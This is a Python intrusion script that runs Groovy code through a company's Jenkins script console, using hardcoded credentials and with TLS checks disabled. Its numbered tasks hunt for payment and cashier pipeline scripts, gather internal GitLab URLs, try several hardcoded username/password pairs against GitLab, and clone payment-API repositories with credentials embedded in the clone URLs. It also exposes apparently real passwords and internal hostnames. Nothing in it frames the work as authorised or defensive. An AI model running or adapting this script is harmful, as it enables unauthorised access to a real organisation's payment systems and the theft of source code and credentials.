import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=240).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK 1: Read cloned infracode groovy scripts for caja/payment ──
script1 = """
// Search the cloned infracode repo for payment/caja related scripts
def baseDir = new File('/tmp/infra_pipelines')
def targets = []

baseDir.eachFileRecurse { f ->
    def name = f.name.toLowerCase()
    if (name.endsWith('.groovy') && (
        name.contains('caja') || name.contains('pago') || name.contains('claropay') ||
        name.contains('payment') || name.contains('tarjeta') || name.contains('t1pago')
    )) {
        targets << f
    }
}

println "PAYMENT/CAJA SCRIPTS (${targets.size()}):"
targets.each { f ->
    println "\\n=== ${f.absolutePath} ==="
    println f.text.take(2000)
    println "---"
}
"""
jenkins_exec(script1, "INFRACODE CAJA/PAYMENT GROOVY SCRIPTS")
time.sleep(1)

# ── TASK 2: Extract GitLab URLs from all groovy scripts ────────
script2 = """
def baseDir = new File('/tmp/infra_pipelines')
def urls = [] as Set

baseDir.eachFileRecurse { f ->
    if (f.name.endsWith('.groovy') || f.name.endsWith('.sh')) {
        def content = f.text
        // Extract git URLs
        def matcher = content =~ /https?:\\/\\/[^\\s'"]+\\.git/
        matcher.each { m ->
            if (m.contains('gitlab') || m.contains('claroshop') || m.contains('infracode') || m.contains('amxdigital')) {
                urls << m
            }
        }
        // Also look for gitlab references without .git
        def matcher2 = content =~ /gitlab\\.dev\\.claroshop\\.com\\/[^\\s'"\\)\\}]+/
        matcher2.each { m -> urls << "http://${m}" }
    }
}

println "ALL GIT URLS FOUND (${urls.size()}):"
urls.sort().each { println "  ${it}" }
"""
jenkins_exec(script2, "EXTRACT ALL GITLAB URLS FROM INFRACODE")
time.sleep(1)

# ── TASK 3: Try jenkins_legacy on GitLab HTTPS ─────────────────
script3 = """
def base = "https://gitlab.dev.claroshop.com"

// Try multiple credentials
def creds = [
    ["jenkins_legacy", "JenkisLegasy25"],
    ["Jenkins", "JenkisLegasy25"],
    ["jenkins.legacy.sn.se@gmail.com", "JenkisLegasy25"],
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
]

creds.each { c ->
    def enc = (c[0]+":"+c[1]).bytes.encodeBase64().toString()
    
    // Test auth
    try {
        def conn = new URL(base + "/api/v4/user").openConnection()
        conn.connectTimeout = 8000; conn.readTimeout = 10000
        conn.setRequestProperty("Authorization", "Basic " + enc)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text?:""
        println "AUTH ${c[0]}: [${code}] ${body.take(200)}"
        
        if (code == 200) {
            // AUTHENTICATED! List member projects
            def conn2 = new URL(base + "/api/v4/projects?membership=true&per_page=100&simple=true").openConnection()
            conn2.connectTimeout = 10000; conn2.readTimeout = 15000
            conn2.setRequestProperty("Authorization", "Basic " + enc)
            conn2.setInstanceFollowRedirects(true)
            def code2 = conn2.responseCode
            def body2 = code2 < 400 ? conn2.inputStream.text : ""
            def matcher = body2 =~ /"path_with_namespace":"([^"]+)"/
            def names = []
            matcher.each { m -> names << m[1] }
            println "  MEMBER PROJECTS (${names.size()}): " + names.join(", ")
        }
    } catch(e) { println "AUTH ${c[0]} ERR: ${e.message?.take(80)}" }
}
"""
jenkins_exec(script3, "GITLAB HTTPS AUTH WITH ALL CREDS")
time.sleep(1)

# ── TASK 4: git clone caja-pagos-api with jenkins_legacy ───────
script4 = """
// Try cloning with jenkins_legacy / JenkisLegasy25
def repos = [
    "https://gitlab.dev.claroshop.com/claroshop/caja-pagos-api.git",
    "https://gitlab.dev.claroshop.com/claroshop/caja-api.git",
    "https://gitlab.dev.claroshop.com/ClaroPay/claropay-api.git",
    "https://gitlab.dev.claroshop.com/caja/caja-pagos-api.git",
]

def creds = [
    ["jenkins_legacy", "JenkisLegasy25"],
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
]

creds.each { c ->
    def user = c[0]; def pass_ = c[1]
    def pass_enc = java.net.URLEncoder.encode(pass_, "UTF-8")
    
    repos.each { repo ->
        def repoName = repo.split('/').last().replace('.git','')
        def dest = "/tmp/clone_${user.replace('_','')}_${repoName}"
        def cloneUrl = repo.replace("https://", "https://${user}:${pass_enc}@")
        
        def r = ["bash","-c","git -c http.sslVerify=false clone --depth=1 '${cloneUrl}' ${dest} 2>&1 | tail -3"].execute().text
        def d = new File(dest)
        if (d.exists()) {
            println "CLONE SUCCESS ${user}@${repoName}: ${d.list()?.join(', ')}"
        } else {
            println "CLONE FAIL ${user}@${repoName}: ${r.take(100)}"
        }
    }
}
"""
jenkins_exec(script4, "GIT CLONE WITH JENKINS_LEGACY")
time.sleep(2)

# ── TASK 5: Read specific groovy scripts for repo URLs ─────────
script5 = """
// Read claropay and payment pipeline scripts in full
def files = [
    '/tmp/infra_pipelines/gs/dev/cs_new_front/cs_new_pipe_build_claropay-api.groovy',
    '/tmp/infra_pipelines/gs/dev/cs_new_front/cs_new_pipe_build_payment-bank-deposit-api.groovy',
    '/tmp/infra_pipelines/gs/dev/cs_legacy_front/cs_legacy_pipe_build_caja-api.groovy',
    '/tmp/infra_pipelines/gs/dev/cs_legacy_front/cs_legacy_pipe_build_caja-pagos-api.groovy',
]

files.each { path ->
    def f = new File(path)
    if (f.exists()) {
        println "\\n=== ${path} ==="
        println f.text
    } else {
        println "NOT FOUND: ${path}"
    }
}

// Also find all legacy front scripts
println "\\n=== LEGACY FRONT SCRIPTS ==="
def legacyDir = new File('/tmp/infra_pipelines/gs/dev/cs_legacy_front')
if (legacyDir.exists()) {
    legacyDir.eachFileRecurse { f ->
        if (f.name.endsWith('.groovy')) println f.absolutePath
    }
} else {
    println "NOT FOUND - listing /tmp/infra_pipelines/gs/dev/ dirs:"
    new File('/tmp/infra_pipelines/gs/dev/').list()?.each { println "  ${it}" }
}
"""
jenkins_exec(script5, "READ SPECIFIC GROOVY SCRIPTS")
time.sleep(1)

# ── TASK 6: List ALL infra pipelines directory structure ────────
script6 = """
def dir = new File('/tmp/infra_pipelines')
def sb = new StringBuilder()

def printDir
printDir = { d, indent ->
    d.listFiles()?.sort { it.name }?.each { f ->
        sb.append(' ' * indent + f.name + (f.isDirectory() ? '/' : '') + '\\n')
        if (f.isDirectory() && indent < 8) printDir(f, indent+2)
    }
}
printDir(dir, 0)
println sb.toString().take(5000)
"""
jenkins_exec(script6, "INFRA PIPELINES DIRECTORY STRUCTURE")
time.sleep(1)

print("\n\n[DONE] Round 7 complete.")
